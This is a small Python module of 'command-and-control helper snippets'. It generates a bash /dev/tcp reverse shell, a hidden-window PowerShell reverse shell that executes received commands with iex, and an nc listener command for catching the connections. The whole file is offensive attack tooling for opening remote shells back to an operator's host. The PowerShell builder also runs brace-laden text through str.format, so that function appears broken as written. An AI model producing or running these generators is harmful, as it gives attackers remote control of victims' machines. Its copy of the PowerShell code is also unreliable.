"""Command-and-control helper snippets."""

from __future__ import annotations

__all__ = [
    "bash_reverse_shell",
    "powershell_reverse_shell",
    "ncat_listener",
]


def bash_reverse_shell(lhost: str, lport: int) -> str:
    return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"


def powershell_reverse_shell(lhost: str, lport: int) -> str:
    parts = [
        "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});",
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};",
        "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){",
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);",
        "$sendback = (iex $data 2>&1 | Out-String );",
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';",
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);",
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};",
        "$client.Close()",
    ]
    return "powershell -nop -w hidden -c \"{}\"".format(
        " ".join(parts).format(host=lhost, port=lport)
    )


def ncat_listener(port: int, *, ssl: bool = False, verbose: bool = False) -> str:
    flags = ["-lvnp", str(port)]
    if ssl:
        flags.append("--ssl")
    if verbose:
        flags.append("-v")
    return "nc " + " ".join(flags)
